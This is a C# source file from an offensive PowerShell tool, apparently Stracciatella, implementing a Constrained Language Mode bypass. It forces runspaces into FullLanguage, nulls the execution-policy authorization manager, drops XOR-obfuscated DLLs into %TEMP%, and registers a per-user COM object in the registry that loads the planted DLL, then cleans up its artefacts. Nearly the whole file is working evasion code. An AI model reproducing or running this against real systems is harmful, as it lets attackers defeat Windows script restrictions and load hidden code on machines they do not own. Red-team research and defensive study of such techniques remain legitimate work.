using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

using System.Management.Automation;
using System.Management.Automation.Runspaces;

#if NETFX_471
using System.Runtime.InteropServices;
#endif
using System.Diagnostics;

#pragma warning disable CS0168

namespace Stracciatella
{
    class DisableClm
    {
        private static bool Verbose = false;

        private static string COM_NAME = "Clm";
        private static string COM_DESCRIPTION = "CLM Support Proxy";
        private static string COM_GUID = "{394aaa50-684e-4870-911a-d045293b3b13}";

        // This has to be %TEMP% as other projects have that path hardcoded. 
        private static string OUTPUT_CLMDISABLEASSEMBLY_PATH = @"%TEMP%\ClmDisableAssembly.dll";
        private static string OUTPUT_CLMDISABLEDLL_PATH = @"%TEMP%\ClmDisableDll.dll";


        // The DLLs unloading functionality may be compiled into Stracciatella only when .Net Framework 4.7.1+ is choosen,
        // as that framework introduced System.Runtime.InteropServices . 
#if NETFX_471
        private static List<Module> CollectModules(Process process)
        {
            List<Module> collectedModules = new List<Module>();

            IntPtr[] modulePointers = new IntPtr[0];
            int bytesNeeded = 0;

            // Determine number of modules
            if (!Native.EnumProcessModulesEx(process.Handle, modulePointers, 0, out bytesNeeded, (uint)Native.ModuleFilter.ListModulesAll))
            {
                return collectedModules;
            }

            int totalNumberofModules = bytesNeeded / IntPtr.Size;
            modulePointers = new IntPtr[totalNumberofModules];

            // Collect modules from the process
            if (Native.EnumProcessModulesEx(process.Handle, modulePointers, bytesNeeded, out bytesNeeded, (uint)Native.ModuleFilter.ListModulesAll))
            {
                for (int index = 0; index < totalNumberofModules; index++)
                {
                    StringBuilder moduleFilePath = new StringBuilder(1024);
                    Native.GetModuleFileNameEx(process.Handle, modulePointers[index], moduleFilePath, (uint)(moduleFilePath.Capacity));

                    string moduleName = Path.GetFileName(moduleFilePath.ToString());
                    Native.ModuleInformation moduleInformation = new Native.ModuleInformation();
                    Native.GetModuleInformation(process.Handle, modulePointers[index], out moduleInformation, (uint)(IntPtr.Size * (modulePointers.Length)));

                    // Convert to a normalized module and add it to our list
                    Module module = new Module(moduleName, moduleInformation.lpBaseOfDll, moduleInformation.SizeOfImage);
                    collectedModules.Add(module);
                }
            }

            return collectedModules;
        }
 
        internal class Native
        {
            
           [StructLayout(LayoutKind.Sequential)]
           public struct ModuleInformation
           {
               public IntPtr lpBaseOfDll;
               public uint SizeOfImage;
               public IntPtr EntryPoint;
           }

           internal enum ModuleFilter
           {
               ListModulesDefault = 0x0,
               ListModules32Bit = 0x01,
               ListModules64Bit = 0x02,
               ListModulesAll = 0x03,
           }

           [DllImport("psapi.dll")]
           public static extern bool EnumProcessModulesEx(IntPtr hProcess, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] IntPtr[] lphModule, int cb, [MarshalAs(UnmanagedType.U4)] out int lpcbNeeded, uint dwFilterFlag);

           [DllImport("psapi.dll")]
           public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, [In] [MarshalAs(UnmanagedType.U4)] uint nSize);

           [DllImport("psapi.dll", SetLastError = true)]
           public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out ModuleInformation lpmodinfo, uint cb);

           [DllImport("kernel32.dll")]
           public static extern int GetCurrentThreadId();

           [DllImport("kernel32.dll", SetLastError = true)]
           public static extern bool FreeLibrary(IntPtr hModule);

           [DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
           public static extern IntPtr GetModuleHandle(string lpModuleName);
           
        }
#endif

        internal class Module
        {
            public Module(string moduleName, IntPtr baseAddress, uint size)
            {
                this.ModuleName = moduleName;
                this.BaseAddress = baseAddress;
                this.Size = size;
            }

            public string ModuleName { get; set; }
            public IntPtr BaseAddress { get; set; }
            public uint Size { get; set; }
        }

        private static bool CreateCOM(PowerShell rs, CustomPSHost host, bool deregister = false)
        {
            string dllPath = @"$($Env:Temp)\ClmDisableDll.dll";

            // Well I'm to lazy to reimplement it in C#
            string registerCOM = @"
                $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;

                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
                $key = 'HKU:\{0}_classes' -f $sid;

                $key = 'HKU:\{0}_classes\CLSID\' -f $sid;
                New-Item -Force -Path $key -Name """ + COM_GUID + @""";
                $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
                New-Item -Force -Path $key -Name 'InProcServer32';
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_DESCRIPTION + @""" -PropertyType String;
                $key = 'HKU:\{0}_classes\CLSID\{1}\InProcServer32' -f $sid, """ + COM_GUID + @""";
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + dllPath + @""" -PropertyType String;
                New-ItemProperty -Force -Path $key -Name 'ThreadingModel' -Value ""Apartment"" -PropertyType String;

                $key = 'HKU:\{0}_classes' -f $sid;
                New-Item -Force -Path $key -Name """ + COM_NAME + @""";
                $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_DESCRIPTION + @""" -PropertyType String;
                New-Item -Force -Path $key -Name 'CLSID';
                $key = 'HKU:\{0}_classes\{1}\CLSID' -f $sid, """ + COM_NAME + @""";
                New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_GUID + @""" -PropertyType String;
";
            string deregisterCOM = @"
                $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;

                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | out-null
                $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
                Remove-Item -Force -Path $key -Recurse | out-null

                $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
                Remove-Item -Force -Path $key -Recurse | out-null
";
            if (deregister)
            {
                return Stracciatella.ExecuteCommand(deregisterCOM, rs, host, true, true).Length > 0;
            }
            else
            {
                return Stracciatella.ExecuteCommand(registerCOM, rs, host, true, true).Length > 0;
            }
        }

        public static bool ProperDisable(PowerShell rs, CustomPSHost host)
        {
            if (DisableClm.Verbose) Console.WriteLine("[.] Step 0. Plant DLL files in: %TEMP%");

            using (BinaryWriter file = new BinaryWriter(File.Open(
                Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH),
                FileMode.Create)))
            {
                byte[] data = Decoder.XorDecodeBinary(ClmEmbeddedFiles.ClmDisableAssemblyData, ClmEmbeddedFiles.FilesXorKey);
                file.Write(data);
            }

            using (BinaryWriter file = new BinaryWriter(File.Open(
                Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH),
                FileMode.Create)))
            {
                byte[] data = Decoder.XorDecodeBinary(ClmEmbeddedFiles.ClmDisableDllData, ClmEmbeddedFiles.FilesXorKey);
                file.Write(data);
            }

            if (DisableClm.Verbose) Console.WriteLine("[.] Step 1. Creating custom COM object.");
            if(!CreateCOM(rs, host))
            {
                if (DisableClm.Verbose) Console.WriteLine("[-] Could not register custom COM object. CLM bypass failed.");
                return false;
            }

            if (DisableClm.Verbose) Console.WriteLine("[.] Step 2. Invoking it...");
            if (DisableClm.Verbose) Stracciatella.ExecuteCommand($"New-Object -ComObject {COM_NAME}", rs, host, true, true, false);

            System.Threading.Thread.Sleep(1000);

            return true;
        }

        private static bool NaiveTry(PowerShell rs)
        {
            bool ret = false;

            if (DisableClm.Verbose) Console.WriteLine("[+] Disabling CLM globally.");
            if (DisableClm.Verbose)
            {
                Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() 
                //    + " / " + Native.GetCurrentThreadId().ToString()
                );
            }

            try
            {
                // Switches back to FullLanguage in CLM
                if (Runspace.DefaultRunspace != null)
                {
                    Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                    Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

                    // Bypasses PowerShell execution policy
                    Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
                    ret |= true;
                }
            }
            catch (Exception e)
            {
                //if (DisableClm.Verbose) Console.WriteLine("[-] Approach #1 failed: " + e);
            }

            try
            {
                rs.Runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                rs.Runspace.InitialSessionState.AuthorizationManager = null;
                rs.Runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
                ret |= true;
            }
            catch (Exception e)
            {
                //if (DisableClm.Verbose) Console.WriteLine("[-] Approach #2 failed: " + e);
            }

            return ret;
        }

        public static bool DoDisable(PowerShell rs, CustomPSHost host, bool verb)
        {
            DisableClm.Verbose = verb;
            NaiveTry(rs);

            return ProperDisable(rs, host);
        }

#if NETFX_471
        private static bool UnloadAndDeleteModule(List<Module> modules, string name, string path, bool verb)
        {
            try
            {
                var mod = Native.GetModuleHandle(name);
                if (mod == IntPtr.Zero)
                {
                    var proc = modules.Find(x => !String.Equals(x.ModuleName, name, StringComparison.CurrentCultureIgnoreCase));
                    if (proc != null)
                    {
                        mod = proc.BaseAddress;
                    }
                }

                if (mod != IntPtr.Zero)
                {
                    Native.FreeLibrary(mod);
                }

                File.Delete(Environment.ExpandEnvironmentVariables(path));
                return true;
            }
            catch (Exception e)
            {
                if (!e.ToString().Contains("System.UnauthorizedAccessException"))
                {
                    if (verb)
                    {
                        Console.WriteLine($"\tRemoving ({name}) failed. Error: {e}");
                    }
                }

                return false;
            }
        }
#endif

        public static bool Cleanup(PowerShell rs, CustomPSHost host, bool verb)
        {
            if (rs != null && host != null)
            {
                if (verb) Console.WriteLine("\n[.] Cleaning up CLM disable artefacts...");
                CreateCOM(rs, host, true);
            }

#if NETFX_471
            else
            {
                bool ret = true;
                try
                {
                    var modules = CollectModules(Process.GetCurrentProcess());
                    ret &= UnloadAndDeleteModule(modules, "ClmDisableAssembly.dll", OUTPUT_CLMDISABLEASSEMBLY_PATH, verb);
                    ret &= UnloadAndDeleteModule(modules, "ClmDisableDll.dll", OUTPUT_CLMDISABLEDLL_PATH, verb);

                    if (!ret) throw new Exception("");
                }
                catch (Exception e)
                {
                    if (verb)
                    {
                        Console.WriteLine("[!] Could not remove CLM evasion DLL files as they were in-use. You'll need to remove them by hand:\n");
                        Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
                        Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
                    }

                    return false;
                }
            }
#endif

            return true;
        }
    }
}
